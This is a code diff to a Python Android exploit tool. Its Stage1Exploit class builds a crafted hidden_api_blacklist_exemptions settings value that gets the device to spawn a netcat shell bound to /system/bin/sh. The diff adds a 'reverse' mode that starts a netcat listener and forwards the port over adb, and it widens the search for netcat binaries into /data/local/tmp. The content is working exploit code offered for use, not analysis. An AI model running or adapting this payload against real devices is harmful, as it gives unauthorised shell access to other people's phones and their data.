@@ -10,6 +10,8 @@ from .exceptions import *
 from ppadb.client import Client as AdbClient
 
 
+reverse = False
+
 class ConnectResult(Enum):
     success = 0
     success_specific_device = 1  # connected to the explicitly specified device
@@ -164,14 +166,16 @@ class Stage1Exploit:
                     "Sorry!"
                 )
 
-        if android_version >= 12:
+        if reverse:
+            return "rev"
+        elif android_version >= 12:
             return "new"
         else:
             return "old"
 
     def find_netcat_command(self) -> list:
         "Tries to find the netcat binary"
-        NETCAT_COMMANDS = [["toybox", "nc"], ["busybox", "nc"], ["nc"]]
+        NETCAT_COMMANDS = [["toybox", "nc"], ["busybox", "nc"], ["nc"], ["/data/local/tmp/toybox", "nc"], ["/data/local/tmp/nc"]]
         for command in NETCAT_COMMANDS:
             result = self.shell_execute(command + ["--help"], True)
             if result["exit_code"] == 0:
@@ -182,7 +186,7 @@ class Stage1Exploit:
     @staticmethod
     def generate_stage1_exploit(command: str, exploit_type: str) -> str:
         "generates the hidden_api_blacklist_exemptions value to trigger the exploit"
-        assert exploit_type in ("old", "new")
+        assert exploit_type in ("rev", "old", "new")
         # commas don't work because they're treated as a separator
         assert "," not in command
         # TODO let you specify the SELinux context through command line arguments
@@ -236,14 +240,22 @@ class Stage1Exploit:
         )
 
         exploit_type = self.exploit_type()
-        if exploit_type == "new":
+        if exploit_type == "rev":
+            print("Using \"reverse\" exploit type")
+        elif exploit_type == "new":
             print("Using new (Android 12+) exploit type")
         elif exploit_type == "old":
             print("Using old (pre-Android 12) exploit type")
 
         netcat_command = self.find_netcat_command()
         parsed_netcat_command = shlex.join(netcat_command)
-        command = f"(settings delete global hidden_api_blacklist_exemptions;{parsed_netcat_command} -s 127.0.0.1 -p 1234 -L /system/bin/sh)&"
+        if exploit_type == "rev":
+            self.shell_execute(f"{parsed_netcat_command} -lp {self.port}")
+            self.device.forward(f"tcp:{self.port}", f"tcp:{self.port}")
+            print("Stage 1 success!")
+            return True
+        else:
+            command = f"(settings delete global hidden_api_blacklist_exemptions;{parsed_netcat_command} -s 127.0.0.1 -p {self.port} -L /system/bin/sh)&"
         exploit_value = self.generate_stage1_exploit(command, exploit_type)
         exploit_command = [
             "settings",
@@ -276,6 +288,7 @@ class Stage1Exploit:
                     )
             time.sleep(0.5)
         print("Stage 1 failed, reboot and try again")
+
         # exploit failed, clean up
         self.shell_execute(
             ["settings", "delete", "global", "hidden_api_blacklist_exemptions"]
